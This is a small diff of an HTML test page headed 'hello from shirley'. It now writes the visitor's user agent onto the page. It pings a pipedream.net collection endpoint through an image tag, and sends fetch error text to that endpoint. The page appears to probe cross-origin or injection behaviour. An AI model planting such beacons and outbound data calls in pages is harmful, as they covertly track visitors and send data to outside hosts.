@@ -1,8 +1,9 @@
 <img src="https://en2celr7rewbul.m.pipedream.net/fetch-cross">
 
-<h1> hello from shirley </h1>
+
 
 <script>
+  
   fetch('https://www.google.com')
                 .then(response => response.text())
                 .then(data => { 
@@ -11,4 +12,5 @@
                 .catch(error => {
                     fetch("https://en2celr7rewbul.m.pipedream.net/fail?data="+error)
                 });
+  document.write('<h1> hello from shirley </h1>'+ navigator.userAgent)
 </script>
